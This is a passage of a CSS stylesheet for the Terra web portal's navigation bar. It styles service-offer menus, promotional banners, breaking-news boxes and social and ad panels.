			color: #ff6800
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background__content__stripe__service--pj {
			color: #0f76cf
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background__content__stripe__service--vivo {
			color: #710097
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background__content__stripe__service--close {
			display: flex;
			justify-content: flex-end
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background__content__information {
			display: flex;
			justify-content: space-between
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background__content__information__list {
			padding: 25px 32px;
			margin: 18px 0;
			width: 100%;
			height: auto;
			border-right: 1px #c1bdbd solid
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background__content__information__list__link {
			height: 30px;
			display: block
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background__content__information__list__logo {
			width: 100%;
			height: 100%
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background__content__information__list__column {
			padding: 20px 0
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background__content__information__list__column__item {
			font-size: 14px;
			padding: 10px 0
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background__content__information__list__column__item--access {
			display: flex;
			flex-direction: column
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor {
			color: #111;
			text-decoration: none
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor--access {
			color: #FF6800;
			font-size: 12px
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor--orange {
			color: #FF6800
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background__content__information__list__column__item__anchor__custom {
			font-size: 12px
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background__content__information__list__button {
			color: #fff;
			display: flex;
			align-items: center;
			justify-content: center;
			font-size: 14px;
			text-decoration: none;
			-webkit-border-radius: 5px;
			-moz-border-radius: 5px;
			border-radius: 5px;
			height: 40px;
			transition: .3s
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background__content__information__list__button:hover {
			opacity: .8
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background__content__information__list__button--orange {
			background-color: #FF6800
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background__content__information__list__button--white {
			border: 1px #FF6800 solid;
			background-color: #fff;
			color: #FF6800;
			margin: 10px 0
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background__content__information__list__contacts {
			display: flex;
			padding: 0 0 20px
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background__content__information__list__contacts__ctc {
			margin: 0 4px
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background__content__information__list__contacts__ctc__name {
			color: #090909;
			font-size: 16px;
			font-weight: 700;
			text-transform: uppercase;
			line-height: 20px
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background__content__information__list__contacts__ctc__number {
			color: #FF6800;
			font-weight: 600;
			font-size: 15px;
			line-height: 20px
		}

		.zaz--standalone .navbar-sva-desktop__pulldown__background__content__information__list__contacts__ctc__other {
			color: #2D2D2D;
			font-size: 11px;
			font-weight: 600;
			line-height: 20px
		}

		.zaz--standalone .navbar-sva-desktop__products__list {
			margin-left: 5px;
			overflow: hidden;
			height: 40px;
			position: relative;
			display: block
		}

		.zaz--standalone .navbar-sva-desktop__products__list__item {
			margin: 0 4px;
			display: inline-flex;
			align-items: center;
			opacity: 1;
			transition: .5s;
			height: 40px
		}

		.zaz--standalone .navbar-sva-desktop__products__list__item__anchor {
			font-family: Ubuntu, 'Open Sans', Arial;
			font-size: 12px;
			text-decoration: none;
			text-transform: uppercase;
			display: flex;
			align-items: center;
			font-weight: 700;
			border-right: 1px #ececec solid;
			height: 28px;
			padding-right: 15px
		}

		.zaz--standalone .navbar-sva-desktop__products__list__item__anchor__class-icon {
			padding-left: 22px
		}

		.zaz--standalone .navbar-sva-desktop__products__list__item__anchor--tag:before {
			content: '';
			background-image: url("https://svadata.terra.com.br/svabar-navbar/promotags/tag_pre_black_friday.png");
			display: block;
			background-repeat: no-repeat;
			position: absolute;
			bottom: -9px;
			right: 0;
			width: 107px;
			height: 20px
		}

		.zaz--standalone .navbar-sva-desktop__products__list__item__anchor--construtor-de-sites {
			color: #1b7fc8
		}

		.zaz--standalone .navbar-sva-desktop__products__list__item__anchor--cursos-online {
			color: #007072
		}

		.zaz--standalone .navbar-sva-desktop__products__list__item__anchor--loja-virtual {
			color: #3b91e6
		}

		.zaz--standalone .navbar-sva-desktop__products__list__item__anchor--curso-de-ingles {
			color: #57bab1
		}

		.zaz--standalone .navbar-sva-desktop__products__list__item__anchor--antivirus {
			color: #af0917
		}

		.zaz--standalone .navbar-sva-desktop__products__list__item__anchor--mail-gigante {
			color: #ec7404
		}

		.zaz--standalone .navbar-sva-desktop__products__list__item__anchor--email-profissional {
			color: #af0917
		}

		.zaz--standalone .navbar-sva-desktop__products__list__item__anchor--terra-ads {
			color: #66af24
		}

		.zaz--standalone .navbar-sva-desktop__products__list__item__anchor--dominio {
			color: #d40b1c
		}

		.zaz--standalone .navbar-sva-desktop__products__list__item__anchor--assistencia {
			color: #f49e00
		}

		.zaz--standalone .navbar-sva-desktop__products__list__item__anchor--musica {
			color: #a64d94
		}

		.zaz--standalone .navbar-sva-desktop__products__list__item__anchor--goread {
			color: #0092c7
		}

		.zaz--standalone .navbar-sva-desktop__products__list__item__anchor--backup {
			color: #e2001a
		}

		.zaz--standalone .navbar-sva-desktop__products__list__item__anchor--hospedagem {
			color: #c20a19
		}

		#zaz-nb-plugin-sva-mob .row-app-n {
			box-sizing: border-box;
			display: -ms-flexbox;
			display: -webkit-box;
			display: flex;
			-ms-flex: 0 1 auto;
			-webkit-box-flex: 0;
			flex: 0 1 auto;
			-ms-flex-direction: row;
			-webkit-box-orient: horizontal;
			-webkit-box-direction: normal;
			flex-direction: row;
			-ms-flex-wrap: wrap;
			flex-wrap: wrap;
			width: 100%
		}

		#zaz-nb-plugin-sva-mob .col-xs-12-app-n,
		#zaz-nb-plugin-sva-mob .col-xs-6-app-n,
		#zaz-nb-plugin-sva-mob .col-xs-app-n {
			box-sizing: border-box;
			-ms-flex: 0 0 auto;
			-webkit-box-flex: 0;
			flex: 0 0 auto
		}

		#zaz-nb-plugin-sva-mob .col-xs-app-n {
			-webkit-flex-grow: 1;
			-ms-flex-positive: 1;
			-webkit-box-flex: 1;
			flex-grow: 1;
			-ms-flex-preferred-size: 0;
			flex-basis: 0;
			max-width: 100%
		}

		#zaz-nb-plugin-sva-mob .col-xs-6-app-n {
			-ms-flex-preferred-size: 50%;
			flex-basis: 50%;
			max-width: 50%
		}

		#zaz-nb-plugin-sva-mob .col-xs-12-app-n {
			-ms-flex-preferred-size: 100%;
			flex-basis: 100%;
			max-width: 100%
		}

		#zaz-nb-plugin-sva-mob {
			font-family: Ubuntu;
			position: relative
		}

		#zaz-nb-plugin-sva-mob .promo-banner {
			position: absolute;
			width: 100%;
			height: 40px;
			background: url("https://p1.trrsf.com.br/image/fget/cf/0/0/0/0/0/0/svadata.terra.com.br/svabar-navbar/promotags/img/banner_273x40_educacaopme2020_desktop.gif");
			background-repeat: no-repeat;
			background-size: contain;
			background-position-x: center;
			background-color: #a4daf1;
			z-index: 9999;
			opacity: 1;
			animation: fadeIn 3s;
			animation-delay: 7s;
			animation-fill-mode: forwards
		}

		#zaz-nb-plugin-sva-mob .nova-barra {
			display: flex;
			align-items: center;
			justify-content: space-around;
			height: 40px;
			background-color: #fff
		}

		#zaz-nb-plugin-sva-mob .nova-barra .itens {
			font-family: 'Open Sans';
			font-size: 14px !important;
			font-weight: 600
		}

		#zaz-nb-plugin-sva-mob .nova-barra .itens span {
			display: flex;
			align-items: center
		}

		#zaz-nb-plugin-sva-mob .nova-barra .itens span .icon {
			margin-left: 8px
		}

		#zaz-nb-plugin-sva-mob .nova-barra .itens a i {
			background-image: url("https://svadata.terra.com.br/svabar-navbar/zaz-navbar-mob/down-arrow.svg") !important
		}

		#zaz-nb-plugin-sva-mob .nova-barra .itens.pra-voce a {
			text-decoration: none;
			color: #ff6700;
			font-size: 14px !important
		}

		#zaz-nb-plugin-sva-mob .nova-barra .itens.pra-voce a.open {
			color: #ff6700
		}

		#zaz-nb-plugin-sva-mob .nova-barra .itens.pra-voce a.open i {
			background-image: url("https://svadata.terra.com.br/svabar-navbar/zaz-navbar-mob/up-arrow_laranja.svg") !important
		}

		#zaz-nb-plugin-sva-mob .nova-barra .itens.pra-empresa a {
			color: #247FC3;
			font-size: 14px !important;
			text-decoration: none
		}

		#zaz-nb-plugin-sva-mob .nova-barra .itens.pra-empresa a.open {
			color: #247FC3
		}

		#zaz-nb-plugin-sva-mob .nova-barra .itens.pra-empresa a.open i {
			background-image: url("https://svadata.terra.com.br/svabar-navbar/zaz-navbar-mob/up-arrow_azul.svg") !important
		}

		#zaz-nb-plugin-sva-mob .openMenu {
			z-index: 9;
			position: fixed;
			flex-direction: column;
			justify-content: center;
			align-items: center;
			background: #fff;
			width: 100%;
			padding-bottom: 30px
		}

		#zaz-nb-plugin-sva-mob .openMenu .content {
			width: 100%;
			display: flex;
			align-items: center;
			justify-content: space-between;
			background-color: #efefef;
			padding: 0 30px
		}

		#zaz-nb-plugin-sva-mob .openMenu .content .marca-sva {
			background-color: #efefef
		}

		#zaz-nb-plugin-sva-mob .openMenu .content .marca-sva a {
			display: flex;
			align-items: center;
			justify-content: space-between;
			height: 50px
		}

		#zaz-nb-plugin-sva-mob .openMenu .content .marca-sva a img {
			width: 190px
		}

		#zaz-nb-plugin-sva-mob .openMenu .content #close i.icon-close {
			background-image: url("https://svadata.terra.com.br/svabar-navbar/zaz-navbar-mob/close.svg")
		}

		#zaz-nb-plugin-sva-mob .openMenu .display-sva {
			margin: 10px auto;
			display: table
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva {
			width: 100%
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slider {
			width: 100%;
			text-align: center;
			overflow: hidden
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides {
			display: flex;
			overflow-x: auto;
			margin-right: 20px;
			border-radius: 5px;
			scroll-behavior: smooth;
			-webkit-overflow-scrolling: touch;
			scroll-snap-points-x: repeat(300px);
			scroll-snap-type: mandatory
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides::-webkit-scrollbar {
			width: 10px;
			height: 10px
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides::-webkit-scrollbar-thumb {
			background: #000;
			border-radius: 10px
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides::-webkit-scrollbar-track {
			background: 0 0
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div {
			flex-shrink: 0;
			width: 230px;
			height: 290px;
			-webkit-border-radius: 5px;
			-moz-border-radius: 5px;
			border-radius: 5px;
			border: 1px #dcdcdc solid;
			background-color: #fcfefe;
			position: relative;
			margin: 0 15px
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .tag-oferta {
			position: absolute;
			top: -19px;
			left: 57px;
			background: #ff6700;
			height: 19px;
			width: 100px;
			text-align: center;
			font-weight: 500;
			color: #fff;
			font-size: 13px;
			display: flex;
			align-items: center;
			justify-content: center
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div a {
			text-decoration: none
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .thumb img {
			height: 100px;
			width: 100%
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .text {
			padding: 118px 2px 0 0
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .text .title {
			text-align: center;
			font-weight: 700;
			margin-bottom: 2px;
			font-size: 17px;
			transform: inherit !important
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .text .title.napster {
			display: flex;
			justify-content: space-around;
			align-items: center;
			width: 220px
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .text .title.napster img {
			width: 89px;
			height: auto;
			position: relative
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .text .title .icon {
			display: inline;
			padding: 0 0 0 20px
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .text .title .icon.icon-sva-ads {
			color: #66AF24
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .text .title .icon.icon-sva-antivirus {
			color: #af0917
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .text .title .icon.icon-sva-assistencia {
			color: #f49e00
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .text .title .icon.icon-sva-backup {
			color: #e21f26
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .text .title .icon.icon-sva-builder {
			color: #147dbe
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .text .title .icon.icon-sva-english-course {
			color: #57bab1
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .text .title .icon.icon-sva-cursos-online {
			color: #067980
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .text .title .icon.icon-sva-dominio {
			color: #d40b1c
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .text .title .icon.icon-sva-mail {
			color: #ec7404
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .text .title .icon.icon-sva-mail-pro {
			color: #af0917
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .text .title .icon.icon-sva-host {
			color: #c20a19
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .text .title .icon.icon-sva-store {
			color: #4093e3
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .text .title .icon.icon-sva-music {
			color: #a64d94
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .text .title .icon.icon-sva-revistas-digitais {
			color: #0192c9
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .text .title .icon.icon-sva-pme {
			color: #364A95
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .text .title .icon.icon-sva-vitrine {
			background-image: url("https://www.terraempresas.com.br/vitrine/assets/img/logo-vitrine.svg");
			background-repeat: no-repeat;
			width: 220px;
			background-size: contain;
			color: transparent;
			font-size: 32px
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .text .title .icon span {
			margin-left: 20px
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .text p {
			color: #504e4e;
			font-size: 15px;
			text-align: center;
			line-height: 22px;
			padding: 10px 20px;
			height: 80px;
			display: flex;
			align-items: end
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .price {
			color: #707070;
			width: 192px;
			margin: 0 auto;
			display: flex;
			flex-direction: column;
			justify-content: flex-end
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .price .de {
			font-size: 12px
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .price .de span {
			text-decoration: line-through
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .price .por {
			font-size: 16px;
			text-align: center
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div .price .por span {
			font-size: 27px;
			font-weight: 700
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slides>div:target {
			transform: scale(0.8)
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .author-info {
			background: rgba(0, 0, 0, .75);
			color: #fff;
			padding: .75rem;
			text-align: center;
			position: absolute;
			bottom: 0;
			left: 0;
			width: 100%;
			margin: 0
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .author-info a {
			color: #fff
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva img {
			object-fit: cover;
			position: absolute;
			top: 0;
			left: 0;
			width: 100%;
			height: 100%
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slider>a {
			display: inline-flex;
			width: 1.5rem;
			height: 1.5rem;
			background: #fff;
			text-decoration: none;
			align-items: center;
			justify-content: center;
			border-radius: 50%;
			margin: 0 0 .5rem;
			position: relative
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slider>a:active {
			top: 1px
		}

		#zaz-nb-plugin-sva-mob .openMenu .carousel-sva .slider>a:focus {
			background: #000
		}

		#zaz-nb-plugin-sva-mob .openMenu .botoes {
			display: flex;
			align-items: center;
			width: 100%;
			justify-content: center;
			margin-top: 20px
		}

		#zaz-nb-plugin-sva-mob .openMenu .botoes a.btn {
			width: 150px;
			height: 40px;
			margin: 0 10px;
			font-size: 15px;
			display: flex;
			align-items: center;
			justify-content: center;
			-webkit-border-radius: 6px;
			-moz-border-radius: 6px;
			border-radius: 6px;
			text-decoration: none
		}

		#zaz-nb-plugin-sva-mob .openMenu .botoes a.btn-laranja {
			background-color: #ff7212;
			color: #fff
		}

		#zaz-nb-plugin-sva-mob .openMenu .botoes a.btn-branco {
			border: 1px #ff7212 solid;
			color: #ff7212
		}

		#zaz-nb-plugin-sva-mob .openMenu .botoes a.btn-branco .icon {
			margin-right: 2px
		}

		#zaz-nb-plugin-sva-mob .openMenu .botoes a.btn-branco .icon.icon-dsPhone {
			background-image: url("https://svadata.terra.com.br/svabar-navbar/zaz-navbar-mob/telefone.svg")
		}

		#zaz-nb-plugin-sva-mob .show {
			display: block !important
		}

		#zaz-nb-plugin-sva-mob .hide {
			display: none
		}

		.overlay-ds:before {
			background-color: #000;
			height: 100%;
			width: 100%;
			content: "";
			opacity: .9;
			position: absolute;
			display: block
		}

		.zaz--standalone .nb__top-banner-evento {
			width: 100%;
			background: #000;
			height: 43px;
			text-align: center;
			color: #fff;
			font-size: 14px;
			padding-top: 6px
		}

		.zaz--standalone .nb__top-banner-evento .link-evento {
			display: block;
			color: #fff;
			text-decoration: none
		}

		.zaz--standalone .nb__top-banner-evento .nao-perca {
			display: inline-block;
			background-color: #ff7212;
			padding: 8px 10px;
			border-radius: 15px;
			font-weight: 700
		}

		.zaz--standalone .nb__top-banner-evento .texto-chamada {
			margin-left: 10px
		}

		.zaz--standalone #zaz-nb-plugin-breakingNews {
			padding-top: 10px;
			margin-bottom: 0;
			display: none
		}

		.zaz--standalone .trr-bnews {
			-webkit-box-shadow: 0 1px 1px 0 rgba(0, 0, 0, .4);
			-moz-box-shadow: 0 1px 1px 0 rgba(0, 0, 0, .4);
			-ms-box-shadow: 0 1px 1px 0 rgba(0, 0, 0, .4);
			box-shadow: 0 1px 1px 0 rgba(0, 0, 0, .4);
			-webkit-border-radius: 5px;
			-moz-border-radius: 5px;
			-ms-border-radius: 5px;
			border-radius: 5px;
			background: #fff;
			clear: both;
			display: none;
			margin: auto;
			position: relative
		}

		.nightmode .zaz--standalone .trr-bnews {
			background: #33332f
		}

		.urgent .zaz--standalone .trr-bnews {
			background: #000
		}

		html[data-range=xlarge] .zaz--standalone .trr-bnews {
			width: 1260px
		}

		html[data-range=large] .zaz--standalone .trr-bnews {
			width: 940px
		}

		html[data-range=medium] .zaz--standalone .trr-bnews,
		html[data-range=small] .zaz--standalone .trr-bnews,
		html[data-range=xsmall] .zaz--standalone .trr-bnews {
			width: 620px
		}

		.zaz--standalone .trr-bnews a {
			text-decoration: none
		}

		.zaz--standalone .trr-bnews.has-news {
			display: block
		}

		.zaz--standalone .trr-bnews__link {
			cursor: default;
			display: block
		}

		.zaz--standalone .trr-bnews.has-link .trr-bnews__link {
			cursor: pointer
		}

		.zaz--standalone .trr-bnews.has-link:hover {
			-webkit-box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .4);
			-moz-box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .4);
			-ms-box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .4);
			box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .4)
		}

		.zaz--standalone .trr-bnews.has-link:hover .trr-bnews__content-inside {
			opacity: .85
		}

		.zaz--standalone .trr-bnews__content-outside {
			margin: 0
		}

		.zaz--standalone .trr-bnews__content-inside {
			display: block;
			margin: 0 auto;
			width: 100%;
			padding: 15px 25px
		}

		.has-hat-text .zaz--standalone .trr-bnews__content-inside {
			display: -webkit-box;
			display: -webkit-flex;
			display: -ms-flexbox;
			display: flex;
			-webkit-box-align: center;
			-webkit-align-items: center;
			-ms-flex-align: center;
			align-items: center
		}

		.zaz--standalone .trr-bnews__hat {
			background-color: #fd9417;
			color: #fff;
			font-family: OpenSans, sans-serif;
			text-decoration: none;
			vertical-align: middle;
			text-align: center;
			-webkit-border-radius: 7px;
			-moz-border-radius: 7px;
			-ms-border-radius: 7px;
			border-radius: 7px;
			display: inline-block;
			max-width: 230px;
			margin: 0 30px 0 0;
			font-weight: 700;
			font-size: 16px;
			line-height: 20px;
			padding: 7px 20px
		}

		.urgent .zaz--standalone .trr-bnews__hat {
			background-color: #d72007
		}

		.zaz--standalone .trr-bnews__title {
			color: #191917;
			display: inline;
			font-family: OpenSans, sans-serif;
			max-width: 100%;
			text-decoration: none;
			vertical-align: middle;
			font-size: 22px;
			line-height: 34px;
			font-weight: 700
		}

		.nightmode .zaz--standalone .trr-bnews__title,
		.urgent .zaz--standalone .trr-bnews__title {
			color: #f1f1f1
		}

		.zaz--standalone .nb__email {
			display: block;
			position: relative;
			width: 24px;
			height: 24px;
			margin-top: 10px;
			color: #fff;
			font-size: 1.4em;
			text-decoration: none
		}

		.zaz--standalone .nb-emailIcon {
			margin-right: 10px
		}

		.zaz--standalone .showShortcuts #zaz-nb-plugin-navbar-email {
			display: none
		}

		.zaz--standalone .nb-disclaimer {
			text-align: center;
			background: #ffe4b4;
			padding: 5px;
			z-index: 1
		}

		.zaz--standalone .nb-disclaimer.vanish {
			padding: 0
		}

		.zaz--standalone .nb-disclaimer a {
			color: inherit
		}

		.zaz--standalone .nb-disclaimer+.nb-disclaimer {
			border-top: 2px solid #fff
		}

		.zaz--standalone .nb-disclaimer-msg {
			margin: auto;
			display: inline-block;
			vertical-align: middle;
			text-align: center;
			font-size: 1.4em
		}

		.zaz--standalone .nb-disclaimer-btn {
			display: inline-block
		}

		.zaz--standalone #trr-globalnav {
			transition: all linear .2s
		}

		.zaz--standalone .nb-menuIcon {
			float: left;
			margin: 0 15px 0 20px
		}

		.zaz--standalone .nb-menuIcon:active,
		.zaz--standalone .nb-menuIcon:hover {
			opacity: .8
		}

		.zaz--standalone .menu_burger {
			position: relative;
			top: 10px;
			float: left
		}

		.zaz--standalone .nb-menuIcon.nb-plugin:before {
			left: 50%
		}

		.zaz--standalone .trr-menu-social-panel div {
			-webkit-box-sizing: content-box;
			-moz-box-sizing: content-box;
			box-sizing: content-box
		}

		.zaz--standalone .trr-menu-social-panel {
			border-top: 1px solid #d7d7d7;
			margin-left: 10px;
			width: 100%;
			text-align: left;
			background-color: #fff;
			overflow: hidden;
			height: 148px;
			display: block
		}

		html[data-range=large] .zaz--standalone .trr-menu-social-panel,
		html[data-range=medium] .zaz--standalone .trr-menu-social-panel,
		html[data-range=xlarge] .zaz--standalone .trr-menu-social-panel {
			display: none
		}

		.zaz--standalone .trr-menu-social-panel .social-panel__loading {
			height: 148px
		}

		html[lang=en-US] .zaz--standalone .trr-menu-social-panel,
		html[lang=es-AR] .zaz--standalone .trr-menu-social-panel,
		html[lang=es-US] .zaz--standalone .trr-menu-social-panel {
			height: 120px
		}

		body #trr-globalnav {
			padding-top: 40px;
			height: 0
		}

		.trr-menu {
			background-color: #fff
		}

		html[data-device-type=web] .trr-menu {
			margin-top: 20px
		}

		#trr-burgernav #searchcontent {
			overflow: hidden
		}

		.nb-menuIcon .lbl-text {
			margin-top: 12px;
			font: 14px OpenSans, sans-serif;
			display: block;
			margin-left: 5px;
			float: left;
			font-weight: 600;
			color: #f1f1f1 !important
		}

		.zaz--standalone .nb-subscribe__phone,
		.zaz--standalone .nb-subscribe__txt {
			display: block;
			text-align: right;
			font-size: 12px;
			line-height: 22px;
			color: #fff;
			-ms-transition: all 200ms linear;
			-webkit-transition: all 200ms linear;
			-moz-transition: all 200ms linear;
			transition: all 200ms linear
		}

		.nb-subscribe:focus .zaz--standalone .nb-subscribe__phone,
		.nb-subscribe:focus .zaz--standalone .nb-subscribe__txt,
		.nb-subscribe:hover .zaz--standalone .nb-subscribe__phone,
		.nb-subscribe:hover .zaz--standalone .nb-subscribe__txt {
			opacity: .8
		}

		.zaz--standalone .nb-subscribe {
			float: left;
			text-align: right
		}

		.zaz--standalone .nb-subscribe__wrap {
			display: block;
			margin: 0;
			margin-top: -8px;
			padding: 0 1em;
			text-decoration: none
		}

		.zaz--standalone .nb-subscribe::after {
			content: '';
			position: absolute;
			height: 33px;
			right: 0;
			top: 0;
			background: -webkit-radial-gradient(center, ellipse farthest-side, #fff, transparent 100%);
			background: -moz-radial-gradient(center, ellipse farthest-side, #fff, transparent 100%);
			background: -o-radial-gradient(center, ellipse farthest-side, #fff, transparent 100%);
			background: -ms-radial-gradient(center, ellipse farthest-side, #fff, transparent 100%);
			background: radial-gradient(center, ellipse farthest-side, #fff, transparent 100%);
			width: 1px;
			margin-top: -6px
		}

		html[data-range=medium] .zaz--standalone .nb-subscribe,
		html[data-range=small] .zaz--standalone .nb-subscribe,
		html[data-range=xsmall] .zaz--standalone .nb-subscribe {
			display: none
		}

		html[data-device-type=web] .zaz--standalone .nb-plugin.nb-socialpanel {
			height: 60px
		}

		html[data-device-type=web] .zaz--standalone .nb-socialpanel__area {
			top: 60px
		}

		html[data-device-type=web] .zaz--standalone .nb-socialpanel:after {
			top: 15px
		}

		.zaz--standalone .nb-socialpanel,
		.zaz--standalone .nb-socialpanel__block {
			margin-top: -20px
		}

		.zaz--standalone .nb-socialpanel div {
			-webkit-box-sizing: content-box;
			-moz-box-sizing: content-box;
			box-sizing: content-box
		}

		.zaz--standalone .nb-plugins--right .nb-plugin.nb-socialpanel {
			height: 40px;
			-ms-transition: all .2s ease-in-out;
			-webkit-transition: all .2s ease-in-out;
			-moz-transition: all .2s ease-in-out;
			transition: all .2s ease-in-out
		}

		html[data-range=small] .zaz--standalone .nb-socialpanel,
		html[data-range=xsmall] .zaz--standalone .nb-socialpanel {
			display: none
		}

		.zaz--standalone .nb-socialpanel:active,
		.zaz--standalone .nb-socialpanel:hover {
			background-color: #de6311
		}

		.zaz--standalone .nb-socialpanel::after {
			content: '';
			position: absolute;
			height: 33px;
			right: 0;
			background: -webkit-radial-gradient(center, ellipse farthest-side, #fff, transparent 100%);
			background: -moz-radial-gradient(center, ellipse farthest-side, #fff, transparent 100%);
			background: -o-radial-gradient(center, ellipse farthest-side, #fff, transparent 100%);
			background: -ms-radial-gradient(center, ellipse farthest-side, #fff, transparent 100%);
			background: radial-gradient(center, ellipse farthest-side, #fff, transparent 100%);
			width: 1px;
			margin-top: -1px
		}

		.zaz--standalone .nb-socialpanel__block {
			padding: 0 10px;
			height: 40px;
			-ms-transition: all .2s ease-in-out;
			-webkit-transition: all .2s ease-in-out;
			-moz-transition: all .2s ease-in-out;
			transition: all .2s ease-in-out
		}

		.zaz--standalone .nb-socialpanel__block__icon {
			margin: 32px 5px 0;
			height: 16px;
			width: 16px
		}

		.zaz--standalone .nb-socialpanel__block__arrow {
			display: none
		}

		.zaz--standalone .nb-socialpanel__block__arrow::before {
			content: '';
			position: absolute;
			left: 50%;
			bottom: 0;
			width: 0;
			height: 0;
			border-top: solid 5px transparent;
			border-right: solid 5px transparent;
			border-left: solid 5px transparent;
			border-bottom: solid 5px #fff;
			margin-left: -5px
		}

		.zaz--standalone .nb-socialpanel__area {
			position: absolute;
			right: -84px;
			top: 40px;
			height: 0;
			width: 182px;
			text-align: left;
			background-color: #fff;
			box-shadow: 0 1px 1px 0 rgba(0, 0, 0, .4);
			-webkit-border-radius: 0 0 4px 4px;
			-moz-border-radius: 0 0 4px 4px;
			border-radius: 0 0 4px 4px;
			overflow: hidden
		}

		.zaz--standalone .nb-socialpanel__area__title {
			color: #65655d;
			font-family: Ubuntu, sans-serif;
			font-size: 14px;
			padding-top: 15px;
			padding-left: 10px
		}

		.zaz--standalone .nb-socialpanel:hover .nb-socialpanel__block__arrow {
			display: block
		}

		.zaz--standalone .nb-socialpanel:hover .nb-socialpanel__area {
			height: 148px
		}

		.zaz--standalone .social-panel__follow-button {
			height: 20px
		}

		html[lang=en-US] .zaz--standalone .nb-socialpanel:hover .nb-socialpanel__area,
		html[lang=es-AR] .zaz--standalone .nb-socialpanel:hover .nb-socialpanel__area,
		html[lang=es-US] .zaz--standalone .nb-socialpanel:hover .nb-socialpanel__area {
			height: 120px
		}

		#zaz-nb-plugin-pwaInstall {
			margin: 5px 10px 0;
			display: none
		}

		#zaz-nb-plugin-pwaInstall .btn--pwa-install {
			border-color: #fff
		}

		#zaz-nb-plugin-pwaInstall .btn--pwa-install:hover {
			background-color: #ff8e41;
			opacity: 1
		}

		.zaz--standalone #zaz-nb-plugin-ad {
			position: relative;
			overflow: hidden;
			text-align: center;
			background-color: #f8f8f8;
			margin-top: 105px;
			margin-bottom: 30px
		}

		.zaz--standalone #zaz-nb-plugin-ad div {
			text-align: center;
			margin: 0 auto
		}

		.zaz--standalone #zaz-nb-plugin-ad #header-ad-container {
			background-color: #f8f8f8
		}

		.zaz--standalone .nightmode #zaz-nb-plugin-ad,
		.zaz--standalone .nightmode #zaz-nb-plugin-ad #header-ad-container {
			background-color: #000
		}

		.zaz--standalone .nb-back-history {
			cursor: pointer
		}

		.zaz--standalone .nb-back-history .icon {
			float: left;
			position: relative;
			top: 10px
		}

